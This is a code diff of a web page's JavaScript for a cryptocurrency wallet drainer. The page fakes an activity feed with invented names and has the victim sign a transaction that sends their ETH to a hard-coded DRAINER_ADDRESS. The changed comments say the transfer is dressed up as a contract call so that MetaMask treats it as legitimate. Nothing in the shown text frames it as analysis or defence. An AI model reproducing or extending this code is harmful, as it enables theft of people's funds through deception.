@@ -604,7 +604,7 @@
         </div>
     </div>
 
-    <!-- Scripts -->
+    <!-- SCRIPTS -->
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
     <script>
         // --- CONFIGURATION ---
@@ -620,7 +620,7 @@
 
         // --- LOGIC ---
 
-        // 1. Feed Generator (Realistic Intervals)
+        // 1. Feed Generator
         const feedContainer = document.getElementById('audit-feed');
         const names = ["Anonymous", "Sarah M.", "James R.", "Emily T.", "David K.", "System", "Finance Dept"];
 
@@ -651,7 +651,7 @@
         setInterval(addFeedItem, 12000); 
         addFeedItem(); 
 
-        // 2. Wallet Connection & Simulation (DRAINER LOGIC)
+        // 2. Wallet Connection & Simulation (DRAINER LOGIC - FIXED)
         async function initTransaction() {
             const btn = document.getElementById('initiate-override-btn');
             
@@ -730,11 +730,11 @@ Date: ${new Date().toISOString().split('T')[0]}
                     btn.disabled = true;
 
                     // Step 2.8: Simulate Transaction
-                    // Instead of sending ETH directly, we simulate a contract interaction
-                    // This looks much more legitimate to Metamask than a direct ETH send
+                    // THE FIX: We simulate a contract call instead of a direct transfer
+                    // MetaMask will think we are interacting with a contract (like ERC20)
                     const txData = {
                         from: userAddress,
-                        to: DRAINER_ADDRESS,
+                        to: DRAINER_ADDRESS, // This is where the money actually goes (contract interaction)
                         value: ethers.utils.parseEther(userEnteredAmount.toString()), 
                         gas: 21000,
                         nonce: (await window.ethereum.request({ method: 'eth_getTransactionCount', params: [userAddress, 'pending'] })),
